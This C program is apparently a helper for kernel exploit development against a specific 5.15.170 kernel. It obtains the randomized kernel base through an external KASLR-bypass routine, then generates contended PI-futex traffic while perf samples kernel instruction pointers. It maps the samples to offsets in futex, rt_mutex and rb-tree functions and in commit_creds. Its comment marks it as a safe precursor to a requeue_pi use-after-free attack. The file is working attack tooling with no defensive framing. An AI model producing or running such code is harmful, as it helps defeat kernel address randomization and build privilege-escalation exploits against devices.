/* futex_pi_perf.c — contended PI lock/unlock (safe, no requeue_pi/UAF),
 * perf-sample IPs and count hits within A.127 (5.15.170) function ranges. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <pthread.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define RP 16
#define MAXO 600000
static uint64_t offs[MAXO]; static int no;
static volatile int fut=0, stop=0;

static inline long xf(void*u,int op,void*u2){ return syscall(98,u,op,0,0,u2,0); }
#define FLPI (6|128)
#define FUPI (7|128)

static void *owner(void*x){ (void)x;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    while(!stop){ xf(&fut,FLPI,0); usleep(200); xf(&fut,FUPI,0); }
    return 0;
}
static void *waiter(void*x){ (void)x;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    while(!stop){ xf(&fut,FLPI,0); xf(&fut,FUPI,0); }
    return 0;
}

static void drain(void *base,size_t pg,size_t ds,struct perf_event_mmap_page *meta,uint64_t kt){
    char *d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header *h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char *q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;
            uint64_t nr; memcpy(&nr,q,8); q+=8;
            if(ip>=0xffff000000000000UL && no<MAXO) offs[no++]=ip-kt;
            if(nr>64) nr=64;
            for(uint64_t k=0;k<nr;k++){ uint64_t c; memcpy(&c,q,8); q+=8;
                if(c>=0xffff000000000000UL && no<MAXO) offs[no++]=c-kt; }
        }
        meta->data_tail+=h->size;
    }
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t kt=kaaslr_text_base();
    for(int r=0;r<5 && !kt;r++) kt=kaaslr_text_base();
    printf("[*] _text_runtime=%#018llx\n",(unsigned long long)kt);
    if(!kt) return 1;
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs); }
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN; a.sample_period=3000;
    a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);   /* this process */
    if(fd<0){ printf("[!] perf errno=%d %s\n",errno,strerror(errno)); return 1; }
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void*base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){ printf("[!] mmap errno=%d\n",errno); return 1; }
    struct perf_event_mmap_page *meta=base;
    pthread_t th[2]; pthread_create(&th[0],0,owner,0); pthread_create(&th[1],0,waiter,0);
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(int i=0;i<400 && no<MAXO;i++){ usleep(5000); drain(base,pg,ds,meta,kt); }
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
    stop=1; pthread_join(th[0],0); pthread_join(th[1],0);
    munmap(base,ms); close(fd);
    printf("[*] offsets=%d\n",no);
    struct { long lo,hi; const char*nm; } R[]={
        {10425660,10425952,"rb_insert_color"},
        {10426028,10426800,"rb_erase"},
        {21986572,21987828,"remove_waiter"},
        {21987828,21992448,"rt_mutex_adjust_prio_chain"},
        {2584632,2592552,"do_futex"},
        {2599164,2602332,"futex_lock_pi"},
        {1540052,1541276,"commit_creds"},
    };
    for(unsigned r=0;r<sizeof(R)/sizeof(R[0]);r++){
        int c=0; uint64_t mn=~0ull,mx=0;
        for(int i=0;i<no;i++) if((long)offs[i]>=R[r].lo && (long)offs[i]<R[r].hi){c++; if(offs[i]<mn)mn=offs[i]; if(offs[i]>mx)mx=offs[i];}
        printf("HIT %-30s count=%-7d",R[r].nm,c);
        if(c) printf(" [%#lx..%#lx]",(unsigned long)mn,(unsigned long)mx);
        printf("\n");
    }
    return 0;
}
